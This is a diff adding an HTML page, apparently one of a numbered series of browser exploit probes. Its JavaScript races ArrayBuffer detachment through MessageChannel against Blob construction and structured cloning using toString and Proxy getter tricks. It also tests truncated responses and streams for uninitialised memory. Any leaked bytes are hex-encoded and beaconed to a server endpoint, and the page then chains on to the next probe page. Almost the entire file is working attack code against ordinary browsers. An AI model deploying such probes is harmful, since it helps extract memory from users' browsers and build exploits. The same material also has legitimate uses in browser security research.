@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V641</title></head>
+<body><pre id="out">V641 — Blob/MC transfer race + uninit probes</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+var _imgs=[];for(var i=0;i<60;i++)_imgs.push(new Image());
+var _ix=0;
+function bk(tag,d){
+  var img=_imgs[_ix++]||(new Image());
+  img.src='/beacon/V641-'+tag+'?d='+encodeURIComponent(String(d).slice(0,800))+'&t='+Date.now();
+}
+function bytes2hex(arr,off,len){
+  var h='';off=off||0;len=Math.min(len||64,arr.length-off);
+  for(var i=off;i<off+len;i++) h+=('0'+arr[i].toString(16)).slice(-2);
+  return h;
+}
+
+bk('BOOT','v641-transfer-race');
+
+var pending = 0;
+function done(){ if(--pending <= 0){ bk('DONE','v641-complete'); say('DONE'); setTimeout(function(){location.href='v642.html?cb=642001';},20000); } }
+
+/* ================================================================
+ * TEST A: Blob constructor race — transfer AB during toString
+ * If Blob captures raw pointer before copy, freed memory leaks
+ * ================================================================ */
+pending++;
+try {
+  var abA = new ArrayBuffer(4096);
+  new Uint8Array(abA).fill(0x41);
+  var mcA = new MessageChannel();
+  var detachedA = false;
+
+  var evilA = { toString: function() {
+    try { mcA.port2.postMessage(0, [abA]); detachedA = true; } catch(e) { detachedA = 'e:'+e.name; }
+    return 'X';
+  }};
+
+  var blobA = new Blob([abA, evilA]);
+  bk('BLOB-A', 'sz='+blobA.size+',det='+detachedA);
+
+  blobA.arrayBuffer().then(function(result) {
+    var view = new Uint8Array(result);
+    var nonA = 0, firstOff = -1;
+    for (var i = 0; i < Math.min(view.length, 4096); i++) {
+      if (view[i] !== 0x41) { nonA++; if (firstOff < 0) firstOff = i; }
+    }
+    bk('BLOB-A-R', 'len='+result.byteLength+',nonA='+nonA+',first='+firstOff);
+    if (nonA > 0 && firstOff >= 0) {
+      bk('BLOB-A-LEAK', bytes2hex(view, firstOff, 64));
+    }
+    done();
+  }).catch(function(e) { bk('BLOB-A-RERR', e.name); done(); });
+} catch(e) { bk('BLOB-A-ERR', e.name+':'+e.message.slice(0,80)); done(); }
+
+/* ================================================================
+ * TEST B: Blob with reversed order — evil first, AB second
+ * toString fires during conversion of parts[0], then parts[1]=ab
+ * ================================================================ */
+pending++;
+try {
+  var abB = new ArrayBuffer(4096);
+  new Uint8Array(abB).fill(0x42);
+  var mcB = new MessageChannel();
+
+  var evilB = { toString: function() {
+    try { mcB.port2.postMessage(0, [abB]); } catch(e) {}
+    return 'Y';
+  }};
+
+  var blobB = new Blob([evilB, abB]);
+  bk('BLOB-B', 'sz='+blobB.size);
+
+  blobB.arrayBuffer().then(function(result) {
+    var view = new Uint8Array(result);
+    var expected = result.byteLength > 1 ? view[1] : -1;
+    var hasNonB = false;
+    for (var i = 1; i < Math.min(view.length, 4097); i++) {
+      if (view[i] !== 0x42) { hasNonB = true; break; }
+    }
+    bk('BLOB-B-R', 'len='+result.byteLength+',hasNonB='+hasNonB);
+    if (hasNonB) {
+      bk('BLOB-B-LEAK', bytes2hex(view, 0, 64));
+    }
+    done();
+  }).catch(function(e) { bk('BLOB-B-RERR', e.name); done(); });
+} catch(e) { bk('BLOB-B-ERR', e.name+':'+e.message.slice(0,80)); done(); }
+
+/* ================================================================
+ * TEST C: postMessage structured clone race — getter detaches AB
+ * ================================================================ */
+pending++;
+try {
+  var abC = new ArrayBuffer(4096);
+  new Uint8Array(abC).fill(0x43);
+  var mcC = new MessageChannel();
+  var mcC2 = new MessageChannel();
+
+  mcC.port1.onmessage = function(ev) {
+    var d = ev.data;
+    if (d && d.buf instanceof ArrayBuffer) {
+      var view = new Uint8Array(d.buf);
+      var nonC = 0;
+      for (var i = 0; i < view.length; i++) {
+        if (view[i] !== 0x43) { nonC++; break; }
+      }
+      bk('MC-C-R', 'len='+d.buf.byteLength+',nonC='+nonC);
+      if (nonC > 0) bk('MC-C-LEAK', bytes2hex(view, 0, 64));
+    } else {
+      bk('MC-C-R', 'no-buf,type='+(d?typeof d.buf:'null'));
+    }
+    done();
+  };
+
+  var proxyC = new Proxy({buf: abC, idx: 0}, {
+    ownKeys: function() { return ['idx', 'buf']; },
+    get: function(t, prop) {
+      if (prop === 'idx') {
+        try { mcC2.port2.postMessage(0, [abC]); } catch(e) {}
+      }
+      return t[prop];
+    },
+    getOwnPropertyDescriptor: function(t, prop) {
+      return {value: t[prop], writable: true, enumerable: true, configurable: true};
+    }
+  });
+
+  try {
+    mcC.port1.postMessage(proxyC);
+  } catch(e) {
+    bk('MC-C-SERR', e.name);
+    done();
+  }
+} catch(e) { bk('MC-C-ERR', e.name); done(); }
+
+/* ================================================================
+ * TEST D: Fetch with server-side Content-Length mismatch
+ * Server sends CL:4096 but only 2048 bytes of body
+ * ================================================================ */
+pending++;
+try {
+  var xhr = new XMLHttpRequest();
+  xhr.open('GET', '/truncated-leak?sz=4096&actual=2048', true);
+  xhr.responseType = 'arraybuffer';
+  xhr.onload = function() {
+    var ab = xhr.response;
+    if (ab) {
+      var view = new Uint8Array(ab);
+      var nonZero = 0, firstNZ = -1;
+      for (var i = 2048; i < view.length; i++) {
+        if (view[i] !== 0) { nonZero++; if (firstNZ < 0) firstNZ = i; }
+      }
+      bk('FETCH-D', 'len='+ab.byteLength+',status='+xhr.status+',nonZero='+nonZero+',firstNZ='+firstNZ);
+      if (nonZero > 0) bk('FETCH-D-LEAK', bytes2hex(view, firstNZ, 64));
+    } else {
+      bk('FETCH-D', 'no-response,status='+xhr.status);
+    }
+    done();
+  };
+  xhr.onerror = function() { bk('FETCH-D', 'error'); done(); };
+  xhr.ontimeout = function() { bk('FETCH-D', 'timeout'); done(); };
+  xhr.timeout = 5000;
+  xhr.send();
+} catch(e) { bk('FETCH-D-ERR', e.name); done(); }
+
+/* ================================================================
+ * TEST E: Response body from ReadableStream with early close
+ * ================================================================ */
+pending++;
+try {
+  var streamDone = false;
+  var rs = new ReadableStream({
+    start: function(c) {
+      c.enqueue(new Uint8Array(2048).fill(0x45));
+      c.close();
+    }
+  });
+  var resp = new Response(rs, {
+    headers: {'Content-Length': '4096', 'Content-Type': 'application/octet-stream'}
+  });
+  resp.arrayBuffer().then(function(ab) {
+    var view = new Uint8Array(ab);
+    bk('STREAM-E', 'len='+ab.byteLength);
+    if (ab.byteLength > 2048) {
+      var nonZero = 0;
+      for (var i = 2048; i < view.length; i++) {
+        if (view[i] !== 0) { nonZero++; break; }
+      }
+      bk('STREAM-E-EXTRA', 'nonZero='+nonZero);
+      if (nonZero > 0) bk('STREAM-E-LEAK', bytes2hex(view, 2048, 64));
+    }
+    done();
+  }).catch(function(e) { bk('STREAM-E-RERR', e.name); done(); });
+} catch(e) { bk('STREAM-E-ERR', e.name); done(); }
+
+/* ================================================================
+ * TEST F: Worker postMessage large AB → read timing + size
+ * ================================================================ */
+pending++;
+try {
+  var workerCode = 'onmessage=function(e){var v=new Uint8Array(e.data);var nz=0;for(var i=0;i<v.length;i++){if(v[i]!==0){nz++;if(nz>10)break;}}postMessage({len:e.data.byteLength,nz:nz,h0:v[0],h1:v[1]});}';
+  var wBlob = new Blob([workerCode], {type: 'application/javascript'});
+  var wUrl = URL.createObjectURL(wBlob);
+  var worker = new Worker(wUrl);
+
+  worker.onmessage = function(ev) {
+    bk('WORKER-F', 'len='+ev.data.len+',nz='+ev.data.nz+',h0='+ev.data.h0+',h1='+ev.data.h1);
+    worker.terminate();
+    done();
+  };
+  worker.onerror = function(e) {
+    bk('WORKER-F-ERR', e.message||'unknown');
+    done();
+  };
+
+  var abF = new ArrayBuffer(8192);
+  worker.postMessage(abF, [abF]);
+} catch(e) { bk('WORKER-F-ERR', e.name); done(); }
+
+say('Tests launched...');
+</script>
+</body></html>
